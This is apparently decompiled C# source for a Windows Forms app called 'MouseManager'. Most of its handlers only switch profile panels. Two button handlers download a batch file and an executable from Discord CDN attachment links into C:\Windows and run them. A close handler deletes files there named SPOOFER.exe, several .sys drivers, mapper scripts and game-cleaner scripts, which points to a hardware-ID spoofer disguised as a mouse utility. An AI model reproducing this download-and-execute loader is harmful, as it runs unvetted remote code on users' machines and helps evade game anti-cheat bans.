using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Net;
using System.Windows.Forms;
using MouseManager.Properties;
using MouseManager.UserControls;
using Siticone.Desktop.UI.AnimatorNS;
using Siticone.Desktop.UI.WinForms;
using Siticone.Desktop.UI.WinForms.Enums;

namespace MouseManager
{
	// Token: 0x02000009 RID: 9
	public partial class MainPage : Form
	{
		// Token: 0x0600003D RID: 61 RVA: 0x001AA43C File Offset: 0x001A2E3C
		public MainPage()
		{
			this.InitializeComponent();
			new SiticoneShadowForm(this);
			new SiticoneDragControl(this);
			this.PanelSlider.Controls.Add(new Profile1());
			this.PanelSlider.Controls.Add(new Profile2());
			this.PanelSlider.Controls.Add(new Profile3());
			this.PanelSlider.Controls.Add(new Profile4());
			this.PanelSlider.Controls.Add(new Profile5());
			this.PanelSlider.Controls.Add(new Profile6());
		}

		// Token: 0x0600003E RID: 62 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void MainPage_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003F RID: 63 RVA: 0x001AA500 File Offset: 0x001A2F00
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			result = result.AddSeconds((double)unixtime).ToLocalTime();
			return result;
		}

		// Token: 0x06000040 RID: 64 RVA: 0x001A824F File Offset: 0x001A0C4F
		private void Profile1_Click(object sender, EventArgs e)
		{
			this.PanelSlider.Controls.Find("Profile1", false)[0].BringToFront();
		}

		// Token: 0x06000041 RID: 65 RVA: 0x001A8279 File Offset: 0x001A0C79
		private void Profile2_Click(object sender, EventArgs e)
		{
			this.PanelSlider.Controls.Find("Profile2", false)[0].BringToFront();
		}

		// Token: 0x06000042 RID: 66 RVA: 0x001A82A3 File Offset: 0x001A0CA3
		private void Profile3_Click(object sender, EventArgs e)
		{
			this.PanelSlider.Controls.Find("Profile3", false)[0].BringToFront();
		}

		// Token: 0x06000043 RID: 67 RVA: 0x001AA564 File Offset: 0x001A2F64
		private void siticoneButton4_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\Serial_checker.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006432287023104/Serial_checker.bat", fileName);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(fileName);
		}

		// Token: 0x06000044 RID: 68 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticonePictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000045 RID: 69 RVA: 0x001A82CD File Offset: 0x001A0CCD
		private void siticoneButton1_Click(object sender, EventArgs e)
		{
			this.PanelSlider.Controls.Find("Profile4", false)[0].BringToFront();
		}

		// Token: 0x06000046 RID: 70 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel10_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000047 RID: 71 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel9_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000048 RID: 72 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel8_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000049 RID: 73 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel7_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004A RID: 74 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004B RID: 75 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004C RID: 76 RVA: 0x001A82F7 File Offset: 0x001A0CF7
		private void siticoneButton2_Click(object sender, EventArgs e)
		{
			this.PanelSlider.Controls.Find("Profile5", false)[0].BringToFront();
		}

		// Token: 0x0600004D RID: 77 RVA: 0x001AA5DC File Offset: 0x001A2FDC
		private void siticoneButton3_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\dfControl.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899055439457710152/899057380556427345/dfControl.exe", fileName);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(fileName);
		}

		// Token: 0x0600004E RID: 78 RVA: 0x001AA654 File Offset: 0x001A3054
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Windows\\SPOOFER.exe"))
			{
				File.Delete("C:\\Windows\\SPOOFER.exe");
			}
			if (File.Exists("C:\\Windows\\C.exe"))
			{
				File.Delete("C:\\Windows\\C.exe");
			}
			if (File.Exists("C:\\Windows\\C2.exe"))
			{
				File.Delete("C:\\Windows\\C2.exe");
			}
			if (File.Exists("C:\\Windows\\map.bat"))
			{
				File.Delete("C:\\Windows\\map.bat");
			}
			if (File.Exists("C:\\Windows\\map2.bat"))
			{
				File.Delete("C:\\Windows\\map2.bat");
			}
			if (File.Exists("C:\\Windows\\Mzt5fU.sys"))
			{
				File.Delete("C:\\Windows\\Mzt5fU.sys");
			}
			if (File.Exists("C:\\Windows\\Registry.bat"))
			{
				File.Delete("C:\\Windows\\Registry.bat");
			}
			if (File.Exists("C:\\Windows\\uLLYvMz4ZUeq.sys"))
			{
				File.Delete("C:\\Windows\\uLLYvMz4ZUeq.sys");
			}
			if (File.Exists("C:\\Windows\\User.exe"))
			{
				File.Delete("C:\\Windows\\User.exe");
			}
			if (File.Exists("C:\\Windows\\8hyKnYgs.exe"))
			{
				File.Delete("C:\\Windows\\8hyKnYgs.exe");
			}
			if (File.Exists("C:\\Windows\\Serial_checker.bat"))
			{
				File.Delete("C:\\Windows\\Serial_checker.bat");
			}
			if (File.Exists("C:\\Windows\\Apex_Cleaner_2.bat"))
			{
				File.Delete("C:\\Windows\\Apex_Cleaner_2.bat");
			}
			if (File.Exists("C:\\Windows\\CleanerSecond.exe"))
			{
				File.Delete("C:\\Windows\\CleanerSecond.exe");
			}
			if (File.Exists("C:\\Windows\\CleanerFirst.exe"))
			{
				File.Delete("C:\\Windows\\CleanerFirst.exe");
			}
			if (File.Exists("C:\\Windows\\Clear_COD.bat"))
			{
				File.Delete("C:\\Windows\\Clear_COD.bat");
			}
		}

		// Token: 0x0600004F RID: 79 RVA: 0x001A8321 File Offset: 0x001A0D21
		private void siticoneButton5_Click(object sender, EventArgs e)
		{
			this.PanelSlider.Controls.Find("Profile6", false)[0].BringToFront();
		}

        private void siticoneHtmlLabel1_Click(object sender, EventArgs e)
        {

        }
    }
}
